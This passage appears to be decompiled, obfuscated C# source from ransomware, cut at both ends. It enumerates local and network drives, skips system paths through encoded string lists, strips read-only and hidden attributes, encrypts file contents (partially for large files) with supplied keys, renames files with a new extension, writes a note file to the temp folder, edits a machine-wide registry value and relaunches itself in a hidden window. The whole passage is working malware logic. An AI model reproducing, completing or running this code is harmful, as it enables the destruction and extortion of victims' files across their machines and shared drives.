			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void vNDEZKKFshE()
	{
		string string_ = UIqHgaUGjSA(getString_0(107398919));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(sNXkawcfFmeqKOWI(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(sNXkawcfFmeqKOWI(getString_0(107398806)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string acrGOxEZzELwNAvm(string NnxDFoCsgnGzG, int IcUCbCpIXc = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(IcUCbCpIXc);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(NnxDFoCsgnGzG, 1, intPtr, ref IcUCbCpIXc) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void nowMmKZNVgcmM()
	{
		HnVlWPPowq(getString_0(107396719), sNXkawcfFmeqKOWI(getString_0(107398773)));
		string text = sNXkawcfFmeqKOWI(getString_0(107399091));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107400649) + text + getString_0(107400649) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396719);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void imzSfhQVzYADk(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107399026) + string_0 + getString_0(107399049) + ex.Message + getString_0(107395924));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string znndCnnZrNYoVh()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107401341);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107398416);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107398471))) ? getString_0(107398421) : getString_0(107398430));
				break;
			case 0:
				text = getString_0(107398476);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107398443);
				break;
			case 4:
				text = getString_0(107398398);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107398412) : getString_0(107398389));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107398356) : getString_0(107398361)) : getString_0(107398366)) : getString_0(107398407));
				break;
			case 10:
				text = getString_0(107398383);
				break;
			}
		}
		if (text != getString_0(107401341))
		{
			text = getString_0(107398378) + text;
			if (oSVersion.ServicePack != getString_0(107401341))
			{
				text = text + getString_0(107400266) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string qZWFzbdOHe(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395541);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(sNXkawcfFmeqKOWI(getString_0(107395508)));
				streamWriter.WriteLine(getString_0(107395924));
				streamWriter.WriteLine(sNXkawcfFmeqKOWI(getString_0(107389754)));
				streamWriter.WriteLine(string_0);
				if (OtvlrYHFRq)
				{
					streamWriter.WriteLine(getString_0(107395924));
					streamWriter.WriteLine(sNXkawcfFmeqKOWI(getString_0(107389676)));
					streamWriter.WriteLine(aDJKTHVvtfISh.qRWwyoluwsX());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !UpNccIaFzBadyA)
				{
					File.AppendAllText(text, getString_0(107389643) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398333) + ex.Message + getString_0(107395924));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void RSvelGjmuPihIw(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		UQyIdXpopedb.dudAXZhmtbbgbZ CS_0024_003C_003E8__locals0 = new UQyIdXpopedb();
		CS_0024_003C_003E8__locals0.CqITlEjkWXnTK = string_1;
		CS_0024_003C_003E8__locals0.aFwtZhkyhonxJx = string_2;
		CS_0024_003C_003E8__locals0.XXWrItZGjdyeN = string_3;
		CS_0024_003C_003E8__locals0.tNRwfpjZiNCOM = string_4;
		if (uBpdQdBJjeZ && !znndCnnZrNYoVh().Contains(getString_0(107398412)) && !znndCnnZrNYoVh().Contains(getString_0(107398308)))
		{
			GFZLJSSwWLFCpG.CWZhAPWKYWnMhA();
		}
		nQCMwcWKyQk = Convert.FromBase64String(CS_0024_003C_003E8__locals0.XXWrItZGjdyeN);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396204))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = acrGOxEZzELwNAvm(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !eaZULefnOUcJVI.Contains(text))
							{
								eaZULefnOUcJVI.Add(text);
							}
							else if (!eaZULefnOUcJVI.Contains(array[i].Name))
							{
								eaZULefnOUcJVI.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!eaZULefnOUcJVI.Contains(array[i].Name))
							{
								eaZULefnOUcJVI.Add(array[i].Name);
							}
						}
					}
					else if (!eaZULefnOUcJVI.Contains(array[i].Name))
					{
						eaZULefnOUcJVI.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!eaZULefnOUcJVI.Contains(string_0[j]))
				{
					eaZULefnOUcJVI.Add(string_0[j]);
				}
			}
		}
		if (eaZULefnOUcJVI.Contains(sNXkawcfFmeqKOWI(getString_0(107398263))) && ThomocmQwcHBb == getString_0(107396816))
		{
			eaZULefnOUcJVI.Remove(sNXkawcfFmeqKOWI(getString_0(107398263)));
		}
		Parallel.ForEach(eaZULefnOUcJVI, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new UQyIdXpopedb.dudAXZhmtbbgbZ();
			CS_0024_003C_003E8__locals0.sdQWSqnbKDkIYTn = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY = string_0;
			if (bTMUTlJGkGOO && !znndCnnZrNYoVh().Contains(UQyIdXpopedb.getString_0(107398422)) && !znndCnnZrNYoVh().Contains(UQyIdXpopedb.getString_0(107398318)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						FZyglfulTLXH(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (gsXyoeFOorGZ == UQyIdXpopedb.getString_0(107396826))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					IwShHypWIMU(CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY, CS_0024_003C_003E8__locals0.sdQWSqnbKDkIYTn.CqITlEjkWXnTK, CS_0024_003C_003E8__locals0.sdQWSqnbKDkIYTn.tNRwfpjZiNCOM, CS_0024_003C_003E8__locals0.sdQWSqnbKDkIYTn.aFwtZhkyhonxJx, CS_0024_003C_003E8__locals0.sdQWSqnbKDkIYTn.XXWrItZGjdyeN);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				IwShHypWIMU(CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY, CS_0024_003C_003E8__locals0.CqITlEjkWXnTK, CS_0024_003C_003E8__locals0.tNRwfpjZiNCOM, CS_0024_003C_003E8__locals0.aFwtZhkyhonxJx, CS_0024_003C_003E8__locals0.XXWrItZGjdyeN);
			}
		});
	}

	public static void IwShHypWIMU(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107401341));
		List<string> list3 = list2;
		if (wWsTKhWTnA == getString_0(107396382))
		{
			if (EBZNaOLOtuSLZ == getString_0(107396816) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && WHWgOONtIDcZxId(string_0))
			{
				yQvbZWVzRpVzK yQvbZWVzRpVzK = null;
				try
				{
					yQvbZWVzRpVzK = new yQvbZWVzRpVzK(string_0.Replace(getString_0(107396738), getString_0(107401341)));
				}
				catch
				{
					list = lmvggGXyiRUOYf(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					iXUGRicpNdnw(yQvbZWVzRpVzK.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = lmvggGXyiRUOYf(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = lmvggGXyiRUOYf(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = WfwjzXqMlnLKXBb.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0453;
					}
				}
				if ((sWPChGvxft == getString_0(107396382) && !item.EndsWith(text)) || JEkdiihxCoWf.Contains(item))
				{
					continue;
				}
				if (NgbDiBVJKDTW == getString_0(107396816))
				{
					try
					{
						if (SqYdHlCliRAG.MyilMlfEAq(item))
						{
							SqYdHlCliRAG.QRVaUKMRQBopeRUy(item);
						}
					}
					catch
					{
					}
				}
				JEkdiihxCoWf.Add(item);
				if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(item)))
				{
					IDUZlSGaIfn.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (krdgQbbXWsBnkAs == getString_0(107396816) && fileStream.Length > Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024 && !list3.Contains(text))
					{
						if (pRibgXhmfietto == getString_0(107396816))
						{
							foreach (string item2 in tnUDcbYyevrzGRJA)
							{
								if (item.ToLower().EndsWith(item2) && OGIisKmpnCtjYJtSZ == getString_0(107396816))
								{
									if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											aDJKTHVvtfISh.AUzNYWrxJKEB(getString_0(107401454), getString_0(107401449), getString_0(107401404), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && OGIisKmpnCtjYJtSZ == getString_0(107396382))
								{
									try
									{
										aDJKTHVvtfISh.AUzNYWrxJKEB(getString_0(107401454), getString_0(107401449), getString_0(107401404), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = VbJxNITbKqkCPhG.KlRCrLIVmNrA(item, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
						byte[] tRlxUGmSHDq = VbJxNITbKqkCPhG.QTulHfZYmae(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						VbJxNITbKqkCPhG.ilkRJUapRp(item, tRlxUGmSHDq);
						if (string_2 != getString_0(107398286))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107398286))
					{
						yRafPGvxSkX(item, item + string_2, nQCMwcWKyQk);
					}
					else
					{
						yRafPGvxSkX(item, item + getString_0(107398281), nQCMwcWKyQk);
					}
				}
				catch (Exception)
				{
				}
				IL_0453:;
			}
		}
	}

	public static void iXUGRicpNdnw(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		zPoLbQDPrHj.UgmkrRPmQyDLrq CS_0024_003C_003E8__locals0 = new zPoLbQDPrHj();
		CS_0024_003C_003E8__locals0.aGPipPUJxaM = list_0;
		CS_0024_003C_003E8__locals0.NWwyysQYwQDK = string_1;
		CS_0024_003C_003E8__locals0.OyagJirLxGEcF = string_2;
		CS_0024_003C_003E8__locals0.OxsDDfqLEi = string_3;
		CS_0024_003C_003E8__locals0.pyrQmieHmmx = new List<string> { getString_0(107401341) };
		if (sWPChGvxft == getString_0(107396382))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				using List<string>.Enumerator enumerator2 = CS_0024_003C_003E8__locals0.aGPipPUJxaM.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					zPoLbQDPrHj.MlhxfWYHvBPnrE CS_0024_003C_003E8__locals1 = new zPoLbQDPrHj.MlhxfWYHvBPnrE();
					CS_0024_003C_003E8__locals1.nTnXDlFGnPsXG = CS_0024_003C_003E8__locals0;
					CS_0024_003C_003E8__locals1.tDwFwsGDrP = enumerator2.Current;
					if (!CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107401327)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107401334)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107401301)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401252)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401271)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107401246)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107401193)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401212)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401167)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401130)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401153)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401104)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107401110)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107400577)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400520)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400535)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400486)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400501)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400452)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400467)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400418)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400401)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400388)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400367)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107400354)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107400373)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107400324)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(zPoLbQDPrHj.getString_0(107400339)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(sNXkawcfFmeqKOWI(zPoLbQDPrHj.getString_0(107400802))) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400777)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107397084)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400796)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(CS_0024_003C_003E8__locals0.NWwyysQYwQDK) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(zPoLbQDPrHj.getString_0(107400739)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(zPoLbQDPrHj.getString_0(107400766)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(zPoLbQDPrHj.getString_0(107400761)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(zPoLbQDPrHj.getString_0(107400756)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(zPoLbQDPrHj.getString_0(107400719)) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(ZLERFztvScvXGTf) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(bDDJFCkjBbYQ) && !CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(IKRtRLOSqagD))
					{
						if (CS_0024_003C_003E8__locals0.OyagJirLxGEcF.Length != 0)
						{
							string[] oyagJirLxGEcF2 = CS_0024_003C_003E8__locals0.OyagJirLxGEcF;
							int num2 = 0;
							while (num2 < oyagJirLxGEcF2.Length)
							{
								string value2 = oyagJirLxGEcF2[num2];
								if (!CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_1119;
							}
						}
						try
						{
							if (CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(CS_0024_003C_003E8__locals0.NWwyysQYwQDK))
							{
								goto IL_1119;
							}
						}
						catch (Exception)
						{
							goto IL_1119;
						}
						if (CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(string_0) && !JEkdiihxCoWf.Contains(CS_0024_003C_003E8__locals1.tDwFwsGDrP))
						{
							if (NgbDiBVJKDTW == zPoLbQDPrHj.getString_0(107396834))
							{
								try
								{
									if (SqYdHlCliRAG.MyilMlfEAq(CS_0024_003C_003E8__locals1.tDwFwsGDrP))
									{
										SqYdHlCliRAG.QRVaUKMRQBopeRUy(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
									}
								}
								catch
								{
								}
							}
							JEkdiihxCoWf.Add(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
							Thread thread3 = new Thread((ThreadStart)delegate
							{
								try
								{
									if (SidumIOOlYmWUm)
									{
										Console.WriteLine(zPoLbQDPrHj.MlhxfWYHvBPnrE.getString_0(107349541) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + zPoLbQDPrHj.MlhxfWYHvBPnrE.getString_0(107349982) + new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length + zPoLbQDPrHj.MlhxfWYHvBPnrE.getString_0(107349929));
										Console.WriteLine(zPoLbQDPrHj.MlhxfWYHvBPnrE.getString_0(107349516), JEkdiihxCoWf.Count, DPjjDEUnrYJ, ZzaknwGiCeEd);
										Console.WriteLine(zPoLbQDPrHj.MlhxfWYHvBPnrE.getString_0(107349459), VxQUKIskXHMm.Elapsed);
										Console.WriteLine(zPoLbQDPrHj.MlhxfWYHvBPnrE.getString_0(107349952));
									}
								}
								catch
								{
								}
							});
							thread3.Priority = ThreadPriority.Normal;
							thread3.IsBackground = true;
							thread3.Start();
							if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.tDwFwsGDrP)))
							{
								IDUZlSGaIfn.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.tDwFwsGDrP));
							}
							imzSfhQVzYADk(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
							try
							{
								new lERBUhOhgv().ylvknGhZJxVcmAc(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals1.tDwFwsGDrP, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (SidumIOOlYmWUm)
										{
											Console.WriteLine(zPoLbQDPrHj.getString_0(107349992) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107349979) + new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length + zPoLbQDPrHj.getString_0(107349926));
											Console.WriteLine(zPoLbQDPrHj.getString_0(107349949));
										}
									}
									catch
									{
									}
									HnVlWPPowq(sNXkawcfFmeqKOWI(zPoLbQDPrHj.getString_0(107349332)), zPoLbQDPrHj.getString_0(107400667) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107400667) + sNXkawcfFmeqKOWI(zPoLbQDPrHj.getString_0(107349307)) + zPoLbQDPrHj.getString_0(107400667) + Environment.UserName + zPoLbQDPrHj.getString_0(107400667) + sNXkawcfFmeqKOWI(zPoLbQDPrHj.getString_0(107349258)));
								}
							}
							catch (Exception ex18)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, zPoLbQDPrHj.getString_0(107399044) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107349233) + ex18.Message + zPoLbQDPrHj.getString_0(107395942));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length != 0L)
									{
										goto end_IL_08ba;
									}
									goto end_IL_08ba_2;
									end_IL_08ba:;
								}
								catch (Exception ex20)
								{
									if (SWaMdrdKGgzowGl)
									{
										try
										{
											File.AppendAllText(bDDJFCkjBbYQ, zPoLbQDPrHj.getString_0(107399044) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107349184) + ex20.Message + zPoLbQDPrHj.getString_0(107395942));
										}
										catch (Exception)
										{
										}
									}
									ZzaknwGiCeEd++;
									goto end_IL_08ba_2;
								}
								if (!(krdgQbbXWsBnkAs == zPoLbQDPrHj.getString_0(107396834)) || new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length <= Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024 || CS_0024_003C_003E8__locals0.pyrQmieHmmx.Contains(string_0))
								{
									if (OtvlrYHFRq)
									{
										CS_0024_003C_003E8__locals0.NWwyysQYwQDK = YgTmUCLcTtww + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
									}
									string text5 = WQPkeOvEci.SBPfmWOaNeINeU(32);
									string text6 = zPoLbQDPrHj.getString_0(107401359);
									text6 = (UpNccIaFzBadyA ? WQPkeOvEci.JZQcnaocigGbMUm() : zPoLbQDPrHj.getString_0(107401359));
									string s3 = pEVoDrneEBXda.qxtPYzjMemryI(text5 + text6);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != zPoLbQDPrHj.getString_0(107398304))
									{
										if (!NbfRNVirWcO)
										{
											if (!UpNccIaFzBadyA)
											{
												gPkUEdrnpNAX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, nQCMwcWKyQk);
											}
											else
											{
												gPkUEdrnpNAX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, Convert.FromBase64String(text5));
											}
										}
										else
										{
											try
											{
												if (!UpNccIaFzBadyA)
												{
													bgAiWEPrFUh(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
												}
												else
												{
													bgAiWEPrFUh(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
												}
											}
											catch (Exception ex22)
											{
												if (SWaMdrdKGgzowGl)
												{
													try
													{
														File.AppendAllText(bDDJFCkjBbYQ, zPoLbQDPrHj.getString_0(107399044) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107398290) + ex22.Message + zPoLbQDPrHj.getString_0(107395942));
													}
													catch (Exception)
													{
													}
												}
												ZzaknwGiCeEd++;
												try
												{
													File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
												}
												catch (Exception)
												{
												}
												goto end_IL_08ba_2;
											}
										}
									}
									else if (!NbfRNVirWcO)
									{
										if (!UpNccIaFzBadyA)
										{
											gPkUEdrnpNAX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107398299), nQCMwcWKyQk);
										}
										else
										{
											gPkUEdrnpNAX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107398299), Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!UpNccIaFzBadyA)
											{
												bgAiWEPrFUh(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
											}
											else
											{
												bgAiWEPrFUh(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex25)
										{
											if (SWaMdrdKGgzowGl)
											{
												try
												{
													File.AppendAllText(bDDJFCkjBbYQ, zPoLbQDPrHj.getString_0(107399044) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107398290) + ex25.Message + zPoLbQDPrHj.getString_0(107395942));
												}
												catch (Exception)
												{
												}
											}
											ZzaknwGiCeEd++;
											goto end_IL_08ba_2;
										}
									}
									if (UpNccIaFzBadyA)
									{
										if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != zPoLbQDPrHj.getString_0(107398304))
										{
											VbClOPiwZbe(CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, bytes3);
										}
										else
										{
											VbClOPiwZbe(CS_0024_003C_003E8__locals1.tDwFwsGDrP, bytes3);
										}
									}
									goto IL_1119;
								}
								CS_0024_003C_003E8__locals0 = new zPoLbQDPrHj.tdXNNsWJFtDVWeIAq();
								CS_0024_003C_003E8__locals0.FBthsJRqPLob = CS_0024_003C_003E8__locals1;
								CS_0024_003C_003E8__locals0.nTnXDlFGnPsXG = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != zPoLbQDPrHj.getString_0(107398304))
									{
										if (OtvlrYHFRq)
										{
											CS_0024_003C_003E8__locals0.NWwyysQYwQDK = YgTmUCLcTtww + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
										}
										File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + CS_0024_003C_003E8__locals0.NWwyysQYwQDK);
									}
								}
								catch (Exception ex27)
								{
									if (SWaMdrdKGgzowGl)
									{
										try
										{
											File.AppendAllText(bDDJFCkjBbYQ, zPoLbQDPrHj.getString_0(107399044) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107349603) + ex27.Message + zPoLbQDPrHj.getString_0(107395942));
										}
										catch (Exception)
										{
										}
									}
									ZzaknwGiCeEd++;
									goto end_IL_08ba_2;
								}
